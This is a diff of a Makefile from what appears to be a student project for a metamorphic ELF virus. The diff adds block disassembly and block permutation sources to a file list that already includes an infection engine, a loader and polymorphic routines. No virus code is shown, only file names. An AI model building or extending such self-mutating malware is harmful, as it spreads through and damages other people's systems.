@@ -6,7 +6,7 @@
 #    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2018/04/10 17:19:11 by agrumbac          #+#    #+#              #
-#    Updated: 2020/02/22 22:34:46 by ichkamo          ###   ########.fr        #
+#    Updated: 2020/03/01 19:04:40 by ichkamo          ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -26,6 +26,7 @@ SRC =	loader.s                       \
 	virus/adjust_references.c      \
 	virus/copy_loader_to_clone.c   \
 	virus/copy_to_clone.c          \
+	virus/disasm_block.c           \
 	virus/disasm_length.c          \
 	virus/disasm_operands.c        \
 	virus/elf64_iterators.c        \
@@ -35,6 +36,7 @@ SRC =	loader.s                       \
 	virus/infection_engine.c       \
 	virus/log.c                    \
 	virus/metamorph_self.c         \
+	virus/permutate_blocks.c       \
 	virus/permutate_instructions.c \
 	virus/permutate_registers.c    \
 	virus/polymorphic_seed.c       \
